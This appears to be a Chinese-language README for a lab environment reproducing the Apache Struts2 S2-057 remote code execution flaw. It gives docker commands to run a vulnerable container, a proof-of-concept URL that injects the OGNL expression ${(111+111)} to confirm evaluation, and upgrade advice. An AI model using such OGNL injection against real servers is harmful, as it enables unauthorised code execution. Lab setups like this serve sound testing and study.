## Struts2 远程代码执行漏洞(S2-057)环境

### 漏洞信息

 * [S2-057 公告](https://cwiki.apache.org/confluence/display/WW/S2-057)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_struts2_s2-057
 ```

2. 启动环境

 ```
$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-057
 ```
 > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### PoC

> 例如目标地址为：http://127.0.0.1:8080/

访问 `http://127.0.0.1:8080/${(111+111)}/actionChain1.action`

然后 URL 会变为 : `http://127.0.0.1:8080/222/register2.action`, 其中 222 部分为 ognl 表达式 `${(111+111)}` 执行结果。


#### Exp

暂无

### 修复建议

升级Apache struts 至 2.5.17 版本 或者 2.3.35 版本


### 参考链接

* [S2-057 公告](https://cwiki.apache.org/confluence/display/WW/S2-057)
* [【Struts2-代码执行漏洞分析系列】S2-057](https://xz.aliyun.com/t/2618)
